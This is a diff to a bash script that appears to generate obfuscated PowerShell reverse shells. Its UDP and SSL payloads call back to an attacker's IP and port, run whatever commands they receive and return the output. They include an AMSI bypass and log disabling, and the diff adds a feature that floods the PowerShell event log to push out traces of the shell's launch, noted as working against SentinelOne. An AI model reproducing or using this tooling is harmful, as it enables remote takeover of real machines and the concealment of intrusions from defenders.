@@ -616,7 +616,7 @@ else
     pw_sh="powershell"
 fi
 
-
+#Powershell setup
 bp=$(openssl rand -hex $(shuf -i 1-2 -n1))
 client=$(openssl rand -hex $(shuf -i 1-11 -n1))
 stream=$(openssl rand -hex $(shuf -i 1-11 -n1))
@@ -725,7 +725,7 @@ fi
 if [[ $4 == "udp" ]]
 then
     #UDP
-    shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient\"($uport, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
+    shell="$AMSIb$disableLog$logfill$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient\"($uport, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
     
     elif [[ $4 == "tcp" ]]
 then    
@@ -735,7 +735,7 @@ then
 
 else
     #SSL
-    shell="$AMSIb$disableLog$func$fAMSIb\$$ip='$IP';\$$port=$PORT;\$$socket=New-Object Net.\$$placeh\"Sockets.Socket\"([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);\$$socket.Connect(\$$ip, \$$port);\$$networkStream=New-Object System.Net.\$$placeh\"Sockets.\"NetworkStream(\$$socket, \$true);\$$ssl = New-Object Net.Security\$$placeh\".SslStream\"(\$$networkStream, \$false, {\$true}, \$$placeh);\$$ssl.AuthenticateAsClient('google.com',\$$placeh,\$false);while (\$true) {\$Error.Clear();\$$input = New-Object byte[] \$$socket.ReceiveBufferSize;\$$read=\$$ssl.Read(\$$input, 0, \$$input.Length);\$$cmd=[text.encoding]::UTF8.GetString(\$$input,0, \$$read);try {\$$output =  Invoke-Expression -Command \$$cmd | Out-String;} catch {\$$output = \$_.Exception.Message;}if (!\$$output) {\$$output = \$Error[0].Exception.Message;}\$$info = (\$env:UserName) + '@' + (\$env:COMPUTERNAME) + '.' + (\$env:USERDNSDOMAIN) + ([System.Environment]::NewLine) + (get-location) + '>';\$$outbytes = [text.encoding]::UTF8.GetBytes(\$$output+\$$info);if ( \$$cmd -eq '' ) {\$$ssl.Close();\$$networkStream.Close();\$$socket.Close();exit;}else {\$$ssl.Write(\$$outbytes, 0, \$$outbytes.Length);}}"
+    shell="$AMSIb$disableLog$logfill$func$fAMSIb\$$ip='$IP';\$$port=$PORT;\$$socket=New-Object Net.\$$placeh\"Sockets.Socket\"([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);\$$socket.Connect(\$$ip, \$$port);\$$networkStream=New-Object System.Net.\$$placeh\"Sockets.\"NetworkStream(\$$socket, \$true);\$$ssl = New-Object Net.Security\$$placeh\".SslStream\"(\$$networkStream, \$false, {\$true}, \$$placeh);\$$ssl.AuthenticateAsClient('google.com',\$$placeh,\$false);while (\$true) {\$Error.Clear();\$$input = New-Object byte[] \$$socket.ReceiveBufferSize;\$$read=\$$ssl.Read(\$$input, 0, \$$input.Length);\$$cmd=[text.encoding]::UTF8.GetString(\$$input,0, \$$read);try {\$$output =  Invoke-Expression -Command \$$cmd | Out-String;} catch {\$$output = \$_.Exception.Message;}if (!\$$output) {\$$output = \$Error[0].Exception.Message;}\$$info = (\$env:UserName) + '@' + (\$env:COMPUTERNAME) + '.' + (\$env:USERDNSDOMAIN) + ([System.Environment]::NewLine) + (get-location) + '>';\$$outbytes = [text.encoding]::UTF8.GetBytes(\$$output+\$$info);if ( \$$cmd -eq '' ) {\$$ssl.Close();\$$networkStream.Close();\$$socket.Close();exit;}else {\$$ssl.Write(\$$outbytes, 0, \$$outbytes.Length);}}"
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
@@ -2263,9 +2263,9 @@ fi
 
 if [ "$logf" == 1 ]
 then 
-    echo -ne "\n$(greenprint 'r)') Rotate PowerShell Evt. log - $(redprint 'On')"
+    echo -ne "\n$(greenprint 'r)') Rotate PowerShell Evt. log (Works on SentinelOne) - $(redprint 'On')"
 else 
-    echo -ne "\n$(greenprint 'r)') Rotate PowerShell Evt. log - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'r)') Rotate PowerShell Evt. log (Works on SentinelOne) - $(blueprint 'Off')"
     logf=0
     
 fi
@@ -2450,10 +2450,10 @@ Choose an option:  "
         If you enable updog, you can have this file generated and served automatically. 
         You can of course choose to enter a url to any other script you would have run upon connection
 
-        r) Rotate PowerShell Evt. log
+        r) Rotate PowerShell Evt. log (Works on SentinelOne)
         Starts several new powershell processes, passing a long string then exits. 
         Effectivily growing the log over the default size of 15MB, 
-        pushing out the log entries showing this shell spawning
+        pushing out the log entries showing this shell spawning. Not working on MSDefender For Endpoint
 
         p) Protocol
         Choose between TCP, UDP and SSL
